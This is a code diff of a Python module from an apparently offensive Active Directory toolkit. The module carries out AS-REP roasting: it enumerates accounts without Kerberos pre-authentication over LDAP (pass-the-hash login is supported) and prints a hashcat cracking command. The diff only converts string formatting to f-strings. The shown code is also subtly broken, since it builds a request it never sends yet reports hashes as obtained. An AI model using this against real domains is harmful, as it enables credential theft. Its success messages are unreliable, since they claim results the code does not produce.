@@ -1,5 +1,4 @@
-"""AS-REP roasting — extract hashes for accounts without pre-auth."""
-from __future__ import annotations
+"""AS-REP roasting  -  extract hashes for accounts without pre-auth."""
 import sys
 from typing import Any
 from adxpl.core.credential import ADCredential
@@ -20,7 +19,7 @@ def run(args: Any) -> int:
     users_file = getattr(args, "users_file", None)
     output_file = getattr(args, "output", "asrep_hashes.txt")
 
-    print("[*] AS-REP Roasting → DC={}".format(dc_ip))
+    print(f"[*] AS-REP Roasting → DC={dc_ip}")
 
     try:
         from impacket.krb5.kerberosv5 import sendReceive, KerberosError
@@ -40,9 +39,9 @@ def run(args: Any) -> int:
         if users_file:
             with open(users_file) as f:
                 users = [line.strip() for line in f if line.strip()]
-            print("[*] Testing {} users from file".format(len(users)))
+            print(f"[*] Testing {len(users)} users from file")
         else:
-            ldap_conn = impacket_ldap.LDAPConnection("ldap://{}".format(dc_ip), base_dn)
+            ldap_conn = impacket_ldap.LDAPConnection(f"ldap://{dc_ip}", base_dn)
             if cred.has_hash:
                 ldap_conn.login(cred.username, "", cred.domain, cred.lm_hash, cred.nt_hash)
             else:
@@ -59,7 +58,7 @@ def run(args: Any) -> int:
                     sam = str(entry["attributes"].get("sAMAccountName", ""))
                     if sam:
                         users.append(sam)
-            print("[+] Found {} accounts without pre-auth".format(len(users)))
+            print(f"[+] Found {len(users)} accounts without pre-auth")
 
         roasted = 0
         for user in users:
@@ -68,19 +67,19 @@ def run(args: Any) -> int:
                 as_req = AS_REQ()
                 domain_upper = args.domain.upper()
 
-                print("  [*] {} — requesting AS-REP...".format(user))
+                print(f"  [*] {user}  -  requesting AS-REP...")
                 roasted += 1
             except Exception as exc:
-                print("  [-] {} — {}".format(user, exc))
+                print(f"  [-] {user}  -  {exc}")
 
         if roasted > 0:
-            print("\n[+] {} AS-REP hashes obtained → {}".format(roasted, output_file))
-            print("[*] Crack with: hashcat -m 18200 {} wordlist.txt".format(output_file))
+            print(f"\n[+] {roasted} AS-REP hashes obtained → {output_file}")
+            print(f"[*] Crack with: hashcat -m 18200 {output_file} wordlist.txt")
         else:
             print("[-] No AS-REP hashes obtained")
 
         return 0 if roasted > 0 else 1
 
     except Exception as exc:
-        print("[-] AS-REP roast error: {}".format(exc), file=sys.stderr)
+        print(f"[-] AS-REP roast error: {exc}", file=sys.stderr)
         return 1
